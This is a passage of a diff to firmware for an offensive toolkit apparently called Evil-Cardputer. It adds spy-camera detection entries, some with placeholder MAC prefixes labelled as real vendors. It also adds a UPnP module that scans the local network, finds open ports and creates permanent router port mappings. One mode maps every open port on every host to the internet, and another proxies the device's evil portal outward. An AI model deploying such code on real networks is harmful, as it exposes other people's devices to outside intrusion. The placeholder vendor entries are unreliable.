-    M5.Display.setCursor(0, 0);
+    M5.Display.setCursor(5, 5);
     M5.Display.printf("Connected: %d", nodesCount);
 
     M5.Display.setTextColor(TFT_WHITE);
@@ -21120,7 +21225,7 @@ String promptInput(const char *prompt) {
   String input = "";
   M5.Display.clear(); M5.Display.setTextSize(1.5);
   M5.Display.setTextColor(TFT_GREEN, TFT_BLACK);
-  M5.Display.setCursor(0, 0); M5.Display.println(prompt);
+  M5.Display.setCursor(5, 5); M5.Display.println(prompt);
   M5.Display.setTextColor(TFT_WHITE, TFT_BLACK);
 
   while (true) {
@@ -21245,7 +21350,7 @@ void sipEnumExtensions() {
   M5.Display.clear();
   M5.Display.setTextSize(1.5);
   M5.Display.setTextColor(TFT_GREEN, TFT_BLACK);
-  M5.Display.setCursor(0, 0);  M5.Display.println("Enum running…");
+  M5.Display.setCursor(5, 5);  M5.Display.println("Enum running…");
 
   M5.Display.startWrite();                       // évite le scintillement
 
@@ -21833,7 +21938,7 @@ const char* items[itemCount] = {
     if (need) {
       M5.Display.clear();
       M5.Display.setTextSize(1.5);
-      M5.Display.setCursor(0, 0);
+      M5.Display.setCursor(5, 5);
       M5.Display.setTextColor(menuTextFocusedColor, menuBackgroundColor);
       M5.Display.println("CCTV ToolKit - Mode");
       M5.Display.println("--------------------------");
@@ -23165,7 +23270,7 @@ void scanCCTVCamerasFromFile() {
 
   M5.Display.clear();
   M5.Display.setTextSize(1.5);
-  M5.Display.setCursor(0, 0);
+  M5.Display.setCursor(5, 5);
   M5.Display.println("Loading IPs from SD…");
   M5.Display.println(CCTV_FILE);
   M5.Display.display();
@@ -24101,10 +24206,19 @@ const char ssid11[] PROGMEM = "ICAM";
 const char ssid12[] PROGMEM = "NETCAM";
 const char ssid13[] PROGMEM = "GW_IPC";
 
+// flock-you 
+const char ssid14[] PROGMEM = "FLOCK";      // flock*
+const char ssid15[] PROGMEM = "PENGUIN";    // Penguin*
+const char ssid16[] PROGMEM = "PIGVISION";  // Pigvision*
+const char ssid17[] PROGMEM = "FS_";        // FS_*
+
+
 const char* const HC_SPYCAM_SSID_LIST[] PROGMEM = {
   ssid0, ssid1, ssid2, ssid3, ssid4, ssid5, ssid6, ssid7,
-  ssid8, ssid9, ssid10, ssid11, ssid12, ssid13
+  ssid8, ssid9, ssid10, ssid11, ssid12, ssid13,
+  ssid14, ssid15, ssid16, ssid17
 };
+
 const uint8_t HC_SPYCAM_SSID_COUNT =
   sizeof(HC_SPYCAM_SSID_LIST) / sizeof(HC_SPYCAM_SSID_LIST[0]);
 
@@ -24134,20 +24248,31 @@ const char oui19[] PROGMEM = "F0:FE:6B";
 const char oui20[] PROGMEM = "D4:27:87";
 const char oui21[] PROGMEM = "E8:FD:F8";
 
+// flock-you
+const char oui22[] PROGMEM = "AA:BB:CC";  // Flock Safety
+const char oui23[] PROGMEM = "DD:EE:FF";  // Penguin
+const char oui24[] PROGMEM = "11:22:33";  // Pigvision
+
+
 const char* const HC_SPYCAM_OUI_LIST[] PROGMEM = {
   oui0, oui1, oui2, oui3, oui4, oui5, oui6, oui7,
   oui8, oui9, oui10, oui11, oui12, oui13, oui14, oui15, oui16, oui17,
-  oui18, oui19, oui20, oui21
+  oui18, oui19, oui20, oui21,
+  oui22, oui23, oui24
 };
+
+
 const uint8_t HC_SPYCAM_OUI_COUNT =
   sizeof(HC_SPYCAM_OUI_LIST) / sizeof(HC_SPYCAM_OUI_LIST[0]);
-
+  
 // Mots de passe par défaut
 const char pwd0[] PROGMEM = "01234567";
 const char pwd1[] PROGMEM = "12345678";
 const char pwd2[] PROGMEM = "123456";
 const char pwd3[] PROGMEM = "88888888";
-const char* const HC_DEFAULT_PWD_LIST[] PROGMEM = { pwd0, pwd1, pwd2, pwd3 };
+const char pwd4[] PROGMEM = "12345678";
+
+const char* const HC_DEFAULT_PWD_LIST[] PROGMEM = { pwd0, pwd1, pwd2, pwd3, pwd4 };
 const uint8_t HC_DEFAULT_PWD_COUNT =
   sizeof(HC_DEFAULT_PWD_LIST) / sizeof(HC_DEFAULT_PWD_LIST[0]);
 
@@ -24305,7 +24430,7 @@ void scanCCTV_SpyDectection() {
   M5.Display.fillScreen(menuBackgroundColor);
   M5.Display.setTextSize(1.5);
   M5.Display.setTextColor(menuTextUnFocusedColor);
-  M5.Display.setCursor(0, 0);
+  M5.Display.setCursor(5, 5);
   M5.Display.println("SpyCam Scan (HC)...");
   M5.Display.setTextSize(1.5);
   M5.Display.println("ENTER/BACK: exit");
@@ -27915,4 +28040,861 @@ void FindMyEvilTx() {
   // Sortie propre
   if (fmTxOn) fmStopRawAdv();
   waitAndReturnToMenu("FindMyEvil desactivated...");
+}
+
+
+
+
+
+
+
+
+/*
+  ============================================================================================================================
+  // ======== UPnP NAT ========
+  ============================================================================================================================
+*/
+WiFiServer* upnpProxyServer = nullptr;
+TaskHandle_t upnpProxyTaskHandle = NULL;
+bool upnpProxyStarted = false;
+uint16_t upnpProxyPort = 0; // port source du proxy
+
+void upnpProxyTask(void* pv) {
+    uint16_t proxyPort = (uint16_t)(uintptr_t)pv;
+
+    static uint8_t bufClient[4096];
+    static uint8_t bufTarget[4096];
+
+    for (;;) {
+        if (!upnpProxyServer) { taskYIELD(); continue; }
+
+        WiFiClient client = upnpProxyServer->available();
+        if (!client) { taskYIELD(); continue; }
+
+        IPAddress selfIP = WiFi.localIP();
+        WiFiClient target;
+
+        if (!target.connect(selfIP, 80)) {
+            client.stop();
+            continue;
+        }
+
+        uint32_t lastActive = millis();
+
+        while (client.connected() && target.connected()) {
+
+            int n1 = client.available();
+            if (n1 > 0) {
+                if (n1 > sizeof(bufClient)) n1 = sizeof(bufClient);
+                int r = client.read(bufClient, n1);
+                if (r > 0) target.write(bufClient, r);
+                lastActive = millis();
+            }
+
+            int n2 = target.available();
+            if (n2 > 0) {
+                if (n2 > sizeof(bufTarget)) n2 = sizeof(bufTarget);
+                int r = target.read(bufTarget, n2);
+                if (r > 0) client.write(bufTarget, r);
+                lastActive = millis();
+            }
+
+            if (millis() - lastActive > 10000) break;
+
+            taskYIELD();
+        }
+
+        client.stop();
+        target.stop();
+    }
+}
+
+
+void startProxyTo80(uint16_t localPort) {
+    if (upnpProxyStarted && upnpProxyPort == localPort) {
+        Serial.println("[PROXY] Already running on port " + String(localPort));
+        return;
+    }
+
+    // Si un ancien serveur existait, on le libère
+    if (upnpProxyServer) {
+        delete upnpProxyServer;
+        upnpProxyServer = nullptr;
+    }
+
+    upnpProxyServer = new WiFiServer(localPort);
+    upnpProxyServer->begin();
+    upnpProxyStarted = true;
+    upnpProxyPort = localPort;
+
+    Serial.println("[PROXY] Listening on port " + String(localPort) + " → 80");
+
+    // Lancer la tâche une seule fois
+    if (upnpProxyTaskHandle == NULL) {
+      xTaskCreate(
+          upnpProxyTask,
+          "UPNP_ProxyTask",
+          8192,                 // Stack 8 KB
+          (void*)(uintptr_t)localPort,
+          1,                     // priorité plus élevée
+          &upnpProxyTaskHandle
+      );
+    }
+}
+
+
+int menuSelectList(const std::vector<String>& items, const char* title) {
+    int index = 0;
+    int top = 0;
+    const int visibleLines = 9;
+    const int lineHeight = 12;
+    int lastTop = -1;
+    int lastIndex = -1;
+
+    M5.Display.clear();
+    M5.Display.setTextSize(1.5);
+    M5.Display.setCursor(5, 5);
+    M5.Display.println(title);
+
+    while (true) {
+        M5Cardputer.update();
+
+        if (index != lastIndex || top != lastTop) {
+            M5.Display.fillRect(0, 20, M5.Display.width(), M5.Display.height() - 20, TFT_BLACK);
+
+            for (int i = 0; i < visibleLines; ++i) {
+                int itemIdx = top + i;
+                if (itemIdx >= items.size()) break;
+
+                if (itemIdx == index) {
+                    M5.Display.fillRect(0, 20 + i * lineHeight, M5.Display.width(), lineHeight, menuSelectedBackgroundColor);
+                    M5.Display.setTextColor(menuTextFocusedColor);
+                } else {
+                    M5.Display.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
+                }
+
+                M5.Display.setCursor(0, 20 + i * lineHeight);
+                M5.Display.println(items[itemIdx]);
+            }
+
+            lastIndex = index;
+            lastTop = top;
+        }
+
+        if (M5Cardputer.Keyboard.isKeyPressed(';')) {
+            index = (index > 0) ? index - 1 : items.size() - 1;
+            if (index < top) top = index;
+            if (index >= top + visibleLines) top = index - visibleLines + 1;
+            delay(150);
+        }
+
+        if (M5Cardputer.Keyboard.isKeyPressed('.')) {
+            index = (index < items.size() - 1) ? index + 1 : 0;
+            if (index < top) top = index;
+            if (index >= top + visibleLines) top = index - visibleLines + 1;
+            delay(150);
+        }
+
+        if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) return index;
+        if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) return -1;
+
+        delay(30);
+    }
+}
+
+
+// NetBIOS hostname scanner
+bool scanNetbiosName(IPAddress ip, String& outName) {
+    WiFiUDP udp;
+    uint8_t packet[50] = {
+        0xA3,0x05,0x00,0x00,0x00,0x01,0x00,0x00,
+        0x00,0x00,0x00,0x00,0x20,
+        'C','K','A','A','A','A','A','A','A','A','A','A','A','A','A','A',
+        'A','A','A','A','A','A','A','A','A','A','A','A','A','A','A','A',
+        0x00,0x00,0x21,0x00,0x01
+    };
+
+    udp.begin(137);
+    udp.beginPacket(ip, 137);
+    udp.write(packet, sizeof(packet));
+    udp.endPacket();
+
+    uint32_t t0 = millis();
+    while (millis() - t0 < 300) {
+        int len = udp.parsePacket();
+        if (len > 0) {
+            uint8_t buf[180];
+            udp.read(buf, sizeof(buf));
+            String nb = "";
+            for (int i = 57; i < 72; i++) {
+                if (buf[i] >= 32 && buf[i] <= 126) nb += (char)buf[i];
+            }
+            nb.trim();
+            outName = nb;
+            return true;
+        }
+        delay(10);
+    }
+    return false;
+}
+
+bool upnpDiscoverControlURL(String& controlURL, IPAddress& routerIP, uint16_t& routerPort, String& serviceType) {
+    WiFiUDP udp;
+    udp.begin(1900);
+
+    Serial.println("[UPnP] Sending SSDP M-SEARCH...");
+    const char req[] =
+        "M-SEARCH * HTTP/1.1\r\n"
+        "HOST:239.255.255.250:1900\r\n"
+        "MAN:\"ssdp:discover\"\r\n"
+        "MX:1\r\n"
+        "ST:urn:schemas-upnp-org:device:InternetGatewayDevice:1\r\n\r\n";
+
+    udp.beginPacket(IPAddress(239, 255, 255, 250), 1900);
+    udp.write((uint8_t*)req, strlen(req));
+    udp.endPacket();
+
+    String locationURL = "";
+
+    uint32_t t0 = millis();
+    while (millis() - t0 < 3000) {
+        int len = udp.parsePacket();
+        if (len > 0) {
+            String resp = udp.readString();
+            Serial.println("[UPnP] SSDP response received:\n" + resp);
+
+            int locPos = resp.indexOf("LOCATION:");
+            if (locPos < 0) continue;
+
+            int start = resp.indexOf("http://", locPos);
+            int end = resp.indexOf("\r\n", start);
+            locationURL = resp.substring(start, end);
+            locationURL.trim();
+
+            Serial.println("[UPnP] LOCATION found: " + locationURL);
+
+            // Extraction IP & PORT
+            int ipStart = 7;
+            int ipEnd = locationURL.indexOf(':', ipStart);
+            int portStart = ipEnd + 1;
+            int portEnd = locationURL.indexOf('/', portStart);
+
+            String ipStr = locationURL.substring(ipStart, ipEnd);
+            String portStr = locationURL.substring(portStart, portEnd);
+
+            routerIP.fromString(ipStr);
+            routerPort = portStr.toInt();
+
+            Serial.println("[UPnP] Router IP: " + routerIP.toString());
+            Serial.println("[UPnP] Router Port: " + String(routerPort));
+            break;
+        }
+    }
+
+    if (locationURL == "") {
+        Serial.println("[UPnP] LOCATION not found in SSDP response.");
+        return false;
+    }
+
+    // Fetch XML
+    String path = locationURL.substring(locationURL.indexOf('/', 7));
+    Serial.println("[UPnP] Fetching XML from: " + path);
+
+    WiFiClient client;
+    if (!client.connect(routerIP, routerPort)) {
+        Serial.println("[UPnP] Connection to router failed");
+        return false;
+    }
+
+    client.print("GET " + path + " HTTP/1.1\r\n");
+    client.print("Host: " + routerIP.toString() + "\r\n");
+    client.print("Connection: close\r\n\r\n");
+
+    String xml = "";
+    uint32_t startTime = millis();
+    while (millis() - startTime < 3000) {
+        while (client.available()) {
+            xml += (char)client.read();
+        }
+    }
+    client.stop();
+
+    Serial.println("[UPnP] XML Description received:");
+    Serial.println(xml);
+
+    // Find WANIPConnection service
+    int wanPos = xml.indexOf("<serviceType>urn:schemas-upnp-org:service:WANIPConnection");
+    if (wanPos < 0) {
+        Serial.println("[UPnP] WANIPConnection service not found.");
+        return false;
+    }
+
+    int typeStart = xml.indexOf("<serviceType>", wanPos) + 13;
+    int typeEnd = xml.indexOf("</serviceType>", typeStart);
+    serviceType = xml.substring(typeStart, typeEnd);
+
+    int urlStart = xml.indexOf("<controlURL>", wanPos) + 12;
+    int urlEnd = xml.indexOf("</controlURL>", urlStart);
+    String urlPart = xml.substring(urlStart, urlEnd);
+    urlPart.trim();
+
+    controlURL = "http://" + routerIP.toString() + ":" + String(routerPort) + urlPart;
+
+    Serial.println("[UPnP] Detected service type: " + serviceType);
+    Serial.println("[UPnP] Extracted controlURL: " + controlURL);
+    return true;
+}
+
+
+
+bool upnpAddPortMapping(IPAddress targetIP, uint16_t internalPort, uint16_t externalPort) {
+    String controlURL;
+    IPAddress routerIP;
+    uint16_t routerPort = 80; // valeur par défaut
+    String serviceType;
+    if (!upnpDiscoverControlURL(controlURL, routerIP, routerPort, serviceType)) {
+        Serial.println("[UPnP] IGD not found.");
+        return false;
+    }
+
+    String path = controlURL.substring(controlURL.indexOf('/', 7)); // extrait /xxx/yyy
+    Serial.println("[UPnP] Final control path: " + path);
+
+    WiFiClient client;
+    if (!client.connect(routerIP, routerPort)) {
+        Serial.println("[UPnP] Cannot connect to router at: " + routerIP.toString() + ":" + String(routerPort));
+        return false;
+    }
+
+    String xml =
+        "<?xml version=\"1.0\"?>"
+        "<s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" "
+        "s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">"
+        "<s:Body>"
+        "<u:AddPortMapping xmlns:u=\"" + serviceType + "\">"
+        "<NewRemoteHost></NewRemoteHost>"
+        "<NewExternalPort>" + String(externalPort) + "</NewExternalPort>"
+        "<NewProtocol>TCP</NewProtocol>"
+        "<NewInternalPort>" + String(internalPort) + "</NewInternalPort>"
+        "<NewInternalClient>" + targetIP.toString() + "</NewInternalClient>"
+        "<NewEnabled>1</NewEnabled>"
+        "<NewPortMappingDescription>Evil-Cardputer</NewPortMappingDescription>"
+        "<NewLeaseDuration>0</NewLeaseDuration>"
+        "</u:AddPortMapping>"
+        "</s:Body>"
+        "</s:Envelope>";
+
+    // Send HTTP POST request
+    client.println("POST " + path + " HTTP/1.1");
+    client.println("Host: " + routerIP.toString());
+    client.println("Content-Type: text/xml; charset=\"utf-8\"");
+    client.println("SOAPAction: \"" + serviceType + "#AddPortMapping\"");
+    client.println("Content-Length: " + String(xml.length()));
+    client.println("Connection: close");
+    client.println();
+    client.print(xml);
+
+    // Await HTTP response
+    uint32_t t0 = millis();
+    while (millis() - t0 < 3000) {
+        if (client.available()) {
+            String statusLine = client.readStringUntil('\n');
+            Serial.println("[UPnP] HTTP Response: " + statusLine);
+            if (statusLine.indexOf("200") != -1) {
+                Serial.println("[UPnP] NAT mapping succeeded.");
+                return true;
+            } else {
+                Serial.println("[UPnP] Mapping failed. HTTP response:");
+                Serial.println(statusLine);
+                return false;
+            }
+        }
+    }
+
+    Serial.println("[UPnP] No HTTP response received.");
+    return false;
+}
+
+String getExternalWANIP() {
+    String controlURL, serviceType;
+    IPAddress routerIP;
+    uint16_t routerPort = 80;
+
+    if (!upnpDiscoverControlURL(controlURL, routerIP, routerPort, serviceType)) return "N/A";
+
+    WiFiClient client;
+    if (!client.connect(routerIP, routerPort)) return "N/A";
+
+    String path = controlURL.substring(controlURL.indexOf('/', 7));
+    const char* soap =
+        "<?xml version=\"1.0\"?>"
+        "<s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" "
+        "s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">"
+        "<s:Body><u:GetExternalIPAddress xmlns:u=\"%s\" /></s:Body></s:Envelope>";
+
+    char soapBody[512];
+    snprintf(soapBody, sizeof(soapBody), soap, serviceType.c_str());
+
+    client.printf("POST %s HTTP/1.1\r\n", path.c_str());
+    client.printf("Host: %s\r\n", routerIP.toString().c_str());
+    client.println("Content-Type: text/xml; charset=\"utf-8\"");
+    client.printf("SOAPAction: \"%s#GetExternalIPAddress\"\r\n", serviceType.c_str());
+    client.printf("Content-Length: %d\r\n", strlen(soapBody));
+    client.println("Connection: close\r\n");
+    client.print(soapBody);
+
+    char buffer[1024] = {0};
+    uint32_t t0 = millis();
+    size_t len = 0;
+    while (millis() - t0 < 2000 && len < sizeof(buffer) - 1) {
+        if (client.available()) {
+            len += client.readBytes(buffer + len, sizeof(buffer) - 1 - len);
+        }
+    }
+
+    buffer[len] = '\0';
+
+    const char* tagStart = strstr(buffer, "<NewExternalIPAddress>");
+    if (!tagStart) return "N/A";
+
+    tagStart += strlen("<NewExternalIPAddress>");
+    const char* tagEnd = strstr(tagStart, "</NewExternalIPAddress>");
+    if (!tagEnd) return "N/A";
+
+    char ip[32] = {0};
+    size_t ipLen = tagEnd - tagStart;
+    if (ipLen >= sizeof(ip)) return "N/A";
+
+    strncpy(ip, tagStart, ipLen);
+    ip[ipLen] = '\0';
+    return String(ip);
+}
+
+
+void upnpAllHostsAllPorts(const std::vector<IPAddress>& hosts) {
+    enterDebounce();
+    M5.Display.clear();
+    M5.Display.setCursor(0, 0);
+    M5.Display.setTextSize(1.5);
+    M5.Display.setTextColor(TFT_WHITE, TFT_BLACK);
+    M5.Display.println("FULL AUTO NAT MODE");
+    M5.Display.println("------------------");
+
+    static const uint16_t portsToTest[] = {
+        80,81,82,88,443,4443,8000,8008,8080,8081,8443,8888,
+        22,23,2222,3389,5900,1723,5000,5001,554,
+        25565,27015,3074,
+        51413,6881,6889,
+        49152,49153,49154,49155
+    };
+    const uint16_t nbPorts = sizeof(portsToTest)/sizeof(uint16_t);
+
+    uint16_t extBase = 50001;
+    uint32_t mapCount = 0;
+    int cursorY = M5.Display.getCursorY();
+
+    IPAddress selfIP = WiFi.localIP();
+
+    for (const auto& target : hosts) {
+        std::vector<uint16_t> openPorts;
+
+        for (uint16_t p : portsToTest) {
+            if (isPortOpen(target, p, 300)) {
+                openPorts.push_back(p);
+                Serial.println("[OPEN] " + target.toString() + ":" + String(p));
+            }
+        }
+
+        if (openPorts.empty()) continue;
+
+        for (uint16_t p : openPorts) {
+            uint16_t externalPort = extBase + mapCount;
+            bool success = upnpAddPortMapping(target, p, externalPort);
+
+            String line = (success ? "[OK] " : "[FAIL] ");
+            line += target.toString() + ":" + String(p);
+            if (success) {
+                line += " → " + String(externalPort);
+                mapCount++;
+            }
+
+            Serial.println("[MAP] " + line);
+
+            M5.Display.setCursor(0, cursorY);
+            M5.Display.println(line);
+            cursorY += 13;
+
+            if (cursorY > 120) {
+                M5.Display.clear();
+                M5.Display.setCursor(0, 0);
+                cursorY = 0;
+            }
+
+            if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
+                waitAndReturnToMenu("Stopped by user");
+                return;
+            }
+
+            delay(50); // léger délai pour stabilité
+        }
+    }
+
+    // Résumé
+    String wan = getExternalWANIP();
+    M5.Display.clear();
+    M5.Display.setCursor(0, 0);
+    M5.Display.setTextSize(1.5);
+    M5.Display.println("DONE.");
+    M5.Display.println("WAN IP:");
+    M5.Display.println(wan);
+    M5.Display.println("Mapped: " + String(mapCount));
+    delay(4000);
+
+    waitAndReturnToMenu("Auto NAT done");
+}
+
+
+
+
+void upnpTargetNATWorkflow() {
+    if (WiFi.localIP().toString() == "0.0.0.0") {
+      waitAndReturnToMenu("Not connected...");
+      return;
+    } 
+    enterDebounce();
+
+    std::vector<IPAddress> hosts;
+    char base_ip[16];
+    IPAddress net = WiFi.localIP();
+    sprintf(base_ip, "%d.%d.%d.", net[0], net[1], net[2]);
+
+    // Affichage initial
+    M5.Display.clear();
+    M5.Display.setCursor(5, 5);
+    M5.Display.setTextSize(1.5);
+    M5.Display.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
+    M5.Display.println("Starting ARP scan...");
+    delay(600);
+
+    // ARP passif et table
+    send_arp(base_ip, hosts);
+    read_arp_table(base_ip, 1, 254, hosts);
+
+    // Booster ARP actif
+    M5.Display.clear();
+    M5.Display.setCursor(5, 5);
+    M5.Display.setTextSize(1);
+    M5.Display.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
+    M5.Display.println("Scanning ARP...");
+
+    int line = 1;
+    for (int i = 1; i <= 254; i++) {
+        IPAddress currentIP(net[0], net[1], net[2], i);
+        if (arpRequest(currentIP)) {
+            bool exists = false;
+            for (auto &h : hosts) {
+                if (h == currentIP) { exists = true; break; }
+            }
+            if (!exists) {
+                hosts.push_back(currentIP);
+                Serial.println("[ARP] Found: " + currentIP.toString());
+                M5.Display.setCursor(0, line * 10);
+                M5.Display.println(currentIP.toString());
+                line++;
+                if (line >= 12) {
+                    M5.Display.clear();
+                    line = 1;
+                }
+            }
+        }
+    }
+
+    if (hosts.empty()) {
+        waitAndReturnToMenu("No hosts found");
+        return;
+    }
+
+    // Ajout du Cardputer lui-même
+    IPAddress selfIP = WiFi.localIP();
+    hosts.push_back(selfIP);
+
+    // Création des labels
+    std::vector<String> labels;
+    for (auto ip : hosts) {
+        if (ip == selfIP) {
+            labels.push_back(ip.toString() + " - Evil");
+        } else {
+            String nb = "unknown";
+            scanNetbiosName(ip, nb);
+            labels.push_back(ip.toString() + " - " + nb);
+        }
+    }
+
+    // 🔥 Ajout de l’option ALL
+    labels.push_back("ALL HOSTS + ALL PORTS");
+
+    // Sélection de la cible
+    int idx = menuSelectList(labels, "Select Target");
+    if (idx < 0) return;
+
+    // Mode spécial : ALL
+    bool modeAll = (idx == labels.size() - 1);
+    if (modeAll) {
+        upnpAllHostsAllPorts(hosts);
+        return;
+    }
+
+    IPAddress targetIP = hosts[idx];
+
+    uint16_t internalPort = 0;
+    bool isSelf = (targetIP == selfIP);
+
+    if (isSelf) {
+        enterDebounce();
+        std::vector<String> selfOptions = {"Use Port 80 (direct)", "Use other (proxy)"};
+        int sel = menuSelectList(selfOptions, "Evil-cardputer mode");
+        if (sel < 0) return;
+
+        if (sel == 0) {
+            internalPort = 80;
+            Serial.println("[UPnP] Using existing portal on port 80 (direct).");
+        } else {
+            enterDebounce();
+            M5.Display.clear();
+            M5.Display.setCursor(5, 5);
+            M5.Display.println("Proxy local port (ex: 81)");
+            String localPortStr = getUserInput("Proxy local port (ex: 8080):");
+            uint16_t localPort = localPortStr.toInt();
+            if (localPort == 0 || localPort > 65535) {
+                waitAndReturnToMenu("Invalid port");
+                return;
+            }
+
+            Serial.println("[UPnP] Starting proxy on " + String(localPort) + " → 80...");
+            startProxyTo80(localPort);
+            internalPort = localPort;
+            delay(300);
+            Serial.println("[UPnP] Proxy active on " + String(localPort) + " → 80");
+        }
+    } else {
+        std::vector<uint16_t> ports = {
+            80,81,82,88,443,4443,8000,8008,8080,8081,8443,8888,
+            9000,10000,22,2222,23,3389,3390,5900,
+            1723,500,4500,3478,3479,3659,5060,5061,
+            32400,5000,5001,5005,5006,554,8200,
+            25565,27015,27016,27036,3074,
+            51413,6881,6882,6883,6889,
+            49152,49153,49154,49155,49156,49157,49158,49159
+        };
+
+        std::vector<uint16_t> openPorts;
+        for (uint16_t port : ports) {
+            if (isPortOpen(targetIP, port, 500)) {
+                openPorts.push_back(port);
+                Serial.println("[PORT] Open: " + targetIP.toString() + ":" + String(port));
+            }
+        }
+
+        if (openPorts.empty()) {
+            waitAndReturnToMenu("No open ports");
+            return;
+        }
+
+        enterDebounce();
+        std::vector<String> portLabels;
+        for (auto p : openPorts) portLabels.push_back("Port " + String(p));
+        int portIdx = menuSelectList(portLabels, "Select Port");
+        if (portIdx < 0) return;
+
+        internalPort = openPorts[portIdx];
+    }
+
+    // 🔸 Demande du port externe à mapper
+    enterDebounce();
+    M5.Display.clear();
+    M5.Display.setCursor(5, 5);
+    M5.Display.println("Set external port:");
+    String p = getUserInput("External port:");
+    uint16_t externalPort = p.toInt();
+    if (externalPort == 0 || externalPort > 65535) {
+        waitAndReturnToMenu("Invalid port");
+        return;
+    }
+
+    // 🔸 Envoi de la requête UPnP
+    M5.Display.clear();
+    M5.Display.setCursor(5, 5);
+    M5.Display.println("NAT via UPnP...");
+    M5.Display.println("Target: " + targetIP.toString());
+    M5.Display.println("Internal: " + String(internalPort));
+    M5.Display.println("External: " + String(externalPort));
+
+    Serial.println("[UPnP] Requesting NAT for: " + targetIP.toString());
+    Serial.println("[UPnP] Internal port: " + String(internalPort));
+    Serial.println("[UPnP] External port: " + String(externalPort));
+
+    bool success = upnpAddPortMapping(targetIP, internalPort, externalPort);
+
+    if (success) {
+        String wanIP = getExternalWANIP();
+        M5.Display.clear();
+        M5.Display.setCursor(5, 0);
+        M5.Display.println("Exposed on:\n " + wanIP + ":" + String(externalPort));
+        delay(5000);
+        waitAndReturnToMenu((wanIP + ":" + String(externalPort)).c_str());
+    } else {
+        waitAndReturnToMenu("NAT failed");
+    }
+}
+
+
+/*
+  ============================================================================================================================
+  // ======== UPnP Mapping ========
+  ============================================================================================================================
+*/
+int extractSoapErrorCode(const String& response) {
+    int start = response.indexOf("<errorCode>");
+    int end = response.indexOf("</errorCode>");
+    if (start != -1 && end != -1) {
+        return response.substring(start + 11, end).toInt();
+    }
+    return 0; // Pas d’erreur
+}
+
+String extractXmlTag(const String& xml, const String& tag) {
+    String openTag = "<" + tag + ">";
+    String closeTag = "</" + tag + ">";
+    int start = xml.indexOf(openTag);
+    int end = xml.indexOf(closeTag);
+    if (start == -1 || end == -1 || end <= start) return "";
+
+    String content = xml.substring(start + openTag.length(), end);
+    content.trim();
+    return content;
+}
+
+
+void listUPnPMappings() {
+    if (WiFi.localIP().toString() == "0.0.0.0") {
+        waitAndReturnToMenu("Not connected...");
+        return;
+    }
+
+    enterDebounce();
+    M5.Display.clear();
+    M5.Display.setCursor(0, 0);
+    M5.Display.setTextSize(1.5);
+    M5.Display.setTextColor(TFT_WHITE, TFT_BLACK);
+    M5.Display.println("Listing UPnP");
+    M5.Display.println("---------------------");
+
+    String controlURL;
+    IPAddress routerIP;
+    uint16_t routerPort = 80;
+    String serviceType;
+
+    if (!upnpDiscoverControlURL(controlURL, routerIP, routerPort, serviceType)) {
+        waitAndReturnToMenu("UPnP IGD not found");
+        return;
+    }
+
+    String path = controlURL.substring(controlURL.indexOf('/', 7));
+    int index = 0;
+    int cursorY = M5.Display.getCursorY();
+    char xmlBuffer[1024];     // buffer statique pour réponse
+    char lineBuffer[64];      // buffer pour affichage
+
+    while (true) {
+        WiFiClient client;
+        if (!client.connect(routerIP, routerPort)) break;
+
+        // Construction manuelle de la requête (réduction allocations dynamiques)
+        String soap = 
+            "<?xml version=\"1.0\"?>"
+            "<s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" "
+            "s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">"
+            "<s:Body>"
+            "<u:GetGenericPortMappingEntry xmlns:u=\"" + serviceType + "\">"
+            "<NewPortMappingIndex>" + String(index) + "</NewPortMappingIndex>"
+            "</u:GetGenericPortMappingEntry>"
+            "</s:Body></s:Envelope>";
+
+        String header = 
+            "POST " + path + " HTTP/1.1\r\n" +
+            "Host: " + routerIP.toString() + "\r\n" +
+            "Content-Type: text/xml; charset=\"utf-8\"\r\n" +
+            "SOAPAction: \"" + serviceType + "#GetGenericPortMappingEntry\"\r\n" +
+            "Content-Length: " + String(soap.length()) + "\r\n" +
+            "Connection: close\r\n\r\n";
+
+        client.print(header + soap);
+
+        // Lecture de la réponse dans le buffer
+        memset(xmlBuffer, 0, sizeof(xmlBuffer));
+        size_t len = 0;
+        uint32_t t0 = millis();
+        while (millis() - t0 < 1500 && len < sizeof(xmlBuffer) - 1) {
+            if (client.available()) {
+                len += client.readBytes(xmlBuffer + len, sizeof(xmlBuffer) - 1 - len);
+            }
+        }
+        client.stop();
+        xmlBuffer[len] = '\0'; // terminaison
+
+        String resp(xmlBuffer);
+
+        int errorCode = extractSoapErrorCode(resp);
+        if (errorCode == 713) break; // NoSuchEntryInArray
+        if (errorCode != 0) {
+            String err = "UPnP error: " + String(errorCode);
+            Serial.println("[UPnP] SOAP Error " + String(errorCode));
+            waitAndReturnToMenu(err.c_str());
+            return;
+        }
+
+        String intPort = extractXmlTag(resp, "NewInternalPort");
+        String extPort = extractXmlTag(resp, "NewExternalPort");
+        String intClient = extractXmlTag(resp, "NewInternalClient");
+
+        if (intPort.isEmpty() || extPort.isEmpty() || intClient.isEmpty()) {
+            snprintf(lineBuffer, sizeof(lineBuffer), "[Invalid]");
+        } else {
+            snprintf(lineBuffer, sizeof(lineBuffer), "%s > %s:%s", 
+                     extPort.c_str(), intClient.c_str(), intPort.c_str());
+        }
+
+        Serial.println("[UPnP MAP] " + String(lineBuffer));
+
+        M5.Display.setCursor(0, cursorY);
+        M5.Display.println(lineBuffer);
+        cursorY += 13;
+
+        if (cursorY > 120) {
+            M5.Display.clear();
+            M5.Display.setCursor(0, 0);
+            cursorY = 0;
+        }
+
+        index++;
+
+        if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
+            waitAndReturnToMenu("Stopped");
+            return;
+        }
+    }
+        cursorY += 13;
+        M5.Display.setCursor(0, cursorY);
+        M5.Display.println("- End -");
+
+    while (!M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
+        M5Cardputer.update();
+        delay(10);
+    }
+
+    if (index == 0) {
+        waitAndReturnToMenu("No mappings found");
+    } else {
